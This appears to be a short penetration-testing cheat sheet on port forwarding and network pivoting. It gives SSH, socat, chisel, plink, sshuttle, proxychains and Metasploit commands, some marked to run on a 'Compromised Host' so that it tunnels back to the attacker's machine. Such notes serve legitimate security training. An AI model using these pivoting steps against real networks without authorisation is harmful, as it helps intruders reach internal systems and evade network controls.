# Port Fowarding and Proxying
## Port Fowarding
### SSH Tunneling/Local Port Forwarding  
```bash
ssh user@<IP> -p port -L 8001:127.0.0.1:8080 -fN
```

### SSH Remote Port Forwarding
```bash
ssh -R 5555:127.0.0.1:5555 -p2222 <user>@<IP>
```

### Socat - Port Forward
```powershell
./socat.exe TCP-LISTEN:8002,fork,reuseaddr TCP:127.0.0.1:8080
```

### chisel  - Remote Port Forward 
-> Your machine  
```bash
./chisel server -p <listen_port> --reverse &
```

-> Compromised Host
```bash
./chisel client <client_port>:<client_port> R:<local_port>:<target_IP>:<target_port> &
```

### Chisel - Local Port Forward
-> Compromised Host  
```bash
./chisel server -p <listen_port>
```

-> Your Machine  
```bash
./chisel client <client_port>:<client_port> <local_port>:<target_IP>:<target_port>
```

### pklink - Remote Port Forward
```powershell
cmd.exe /c echo y | plink.exe -ssh -l <user> -pw <password> -R 192.168.0.20:1234:127.0.0.1:3306 192.168.0.20
```

## Proxying - Network Pivoting
### sshuttle (Unix) - proxying  
```bash
sshuttle -r user@<ip> --ssh-cmd "ssh -i private_key" 172.16.0.0/24
```

### SSH + Proxychains
edit /etc/proxychains.conf with socks4 127.0.0.1 8080
```bash
ssh -N -D 127.0.0.1:8080 <user>@<ip> -p 2222
```
  
### chisel  - Reverse Proxy
-> Your Machine  
```bash
./chisel server -p listen_port --reverse &
```
-> Compromised Host  
```bash
./chisel client <target_IP>:<listen_port> R:socks &
```

### chisel - Forward Proxy  
-> Compromised Host  
```bash
./chisel server -p <listen_port> --socks5
```
-> Your Machine  
```bash
./chisel client <target_P>:<listen_port> <proxy_port>:socks
```

### metasploit - proxying 
```bash
route add <ip>/24 1
route print
use auxiliary/server/socks_proxy
run
```
